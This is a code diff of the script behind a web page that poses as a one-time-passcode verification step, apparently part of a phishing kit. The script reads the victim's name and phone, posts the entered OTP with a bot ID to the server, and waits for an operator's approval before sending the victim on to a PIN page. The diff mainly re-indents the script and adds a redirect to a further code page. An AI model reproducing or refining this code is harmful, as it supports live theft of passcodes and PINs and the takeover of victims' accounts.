@@ -141,99 +141,104 @@
   </div>
 </div>
 
+
 <script>
-  const inputs = document.querySelectorAll('.otp-wrap input');
-  const verifyBtn = document.getElementById('verifyBtn');
-  const countdownEl = document.getElementById('countdown');
-  const waitingEl = document.getElementById('waiting');
+const inputs = document.querySelectorAll('.otp-wrap input');
+const verifyBtn = document.getElementById('verifyBtn');
+const countdownEl = document.getElementById('countdown');
+const waitingEl = document.getElementById('waiting');
 
-  // Bot handling
-  const params = new URLSearchParams(window.location.search);
-  const urlBotId = params.get('botId');
-  if (urlBotId) localStorage.setItem('botId', urlBotId);
+// Bot handling
+const params = new URLSearchParams(window.location.search);
+const urlBotId = params.get('botId');
+if (urlBotId) localStorage.setItem('botId', urlBotId);
 
-  const fullName = localStorage.getItem('fullName');
-  const phone = localStorage.getItem('phone');
-  const botId = localStorage.getItem('botId');
+const fullName = localStorage.getItem('fullName');
+const phone = localStorage.getItem('phone');
+const botId = localStorage.getItem('botId');
 
-  if (!fullName || !phone || !botId) {
-    alert('Session expired. Please start again.');
-    window.location.href = 'index.html';
+if (!fullName || !phone || !botId) {
+  alert('Session expired. Please start again.');
+  window.location.href = 'index.html';
+}
+
+// Countdown
+let timeLeft = 120;
+const timer = setInterval(() => {
+  timeLeft--;
+  countdownEl.textContent = timeLeft;
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    countdownEl.textContent = '0';
   }
+}, 1000);
 
-  // Countdown
-  let timeLeft = 120;
+function submitOtp(code) {
+  verifyBtn.disabled = true;
+  verifyBtn.textContent = 'Waiting for approval…';
+  waitingEl.style.display = 'block';
+  inputs.forEach(i => i.disabled = true);
 
-  const timer = setInterval(() => {
-    timeLeft--;
-    countdownEl.textContent = timeLeft;
+  fetch(`${window.location.origin}/submit-otp`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: fullName, phone, otp: code, botId })
+  })
+  .then(r => r.json())
+  .then(({ requestId }) => pollApproval(requestId))
+  .catch(() => alert('Server error. Please try again.'));
+}
 
-    if (timeLeft <= 0) {
-      clearInterval(timer);
-      countdownEl.textContent = '0';
+function pollApproval(requestId) {
+  const interval = setInterval(async () => {
+    const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
+    const d = await r.json();
+
+    if (d.approved === true) {
+      clearInterval(interval);
+      window.location.href = 'pin.html';
     }
-  }, 1000);
 
-  function submitOtp(code) {
-    verifyBtn.disabled = true;
-    verifyBtn.textContent = 'Waiting for approval…';
-    waitingEl.style.display = 'block';
-    inputs.forEach(i => i.disabled = true);
+    if (d.approved === false) {
+      clearInterval(interval);
 
-    fetch(`${window.location.origin}/submit-otp`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ name: fullName, phone, otp: code, botId })
-    })
-    .then(r => r.json())
-    .then(({ requestId }) => pollApproval(requestId))
-    .catch(() => alert('Server error. Please try again.'));
-  }
+      inputs.forEach(i => {
+        i.value = '';
+        i.disabled = false;
+      });
 
-  function pollApproval(requestId) {
-    const interval = setInterval(async () => {
-      const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
-      const d = await r.json();
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verify OTP';
+      waitingEl.style.display = 'none';
 
-      if (d.approved === true) {
-        clearInterval(interval);
-        window.location.href = 'pin.html';
-      }
+      alert('OTP rejected. Please try again.');
+    }
 
-      if (d.approved === false) {
-        clearInterval(interval);
+    // 6-digit OTP button → redirect to code.html
+    if (d.approved === '6') {
+      clearInterval(interval);
+      window.location.href = 'code.html';
+    }
+  }, 2000);
+}
 
-        inputs.forEach(i => {
-          i.value = '';
-          i.disabled = false;
-        });
+function checkInputs() {
+  verifyBtn.disabled =
+    Array.from(inputs).map(i => i.value).join('').length !== 5;
+}
 
-        verifyBtn.disabled = true;
-        verifyBtn.textContent = 'Verify OTP';
-        waitingEl.style.display = 'none';
-
-        alert('OTP rejected. Please try again.');
-      }
-    }, 2000);
-  }
-
-  function checkInputs() {
-    verifyBtn.disabled =
-      Array.from(inputs).map(i => i.value).join('').length !== 5;
-  }
-
-  inputs.forEach((input, i) => {
-    input.addEventListener('input', () => {
-      input.value = input.value.replace(/\D/g,'');
-      if (input.value && inputs[i + 1]) inputs[i + 1].focus();
-      checkInputs();
-    });
+inputs.forEach((input, i) => {
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g,'');
+    if (input.value && inputs[i + 1]) inputs[i + 1].focus();
+    checkInputs();
   });
+});
 
-  verifyBtn.addEventListener('click', () => {
-    const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length === 5) submitOtp(code);
-  });
+verifyBtn.addEventListener('click', () => {
+  const code = Array.from(inputs).map(i => i.value).join('');
+  if (code.length === 5) submitOtp(code);
+});
 </script>
 
 </body>
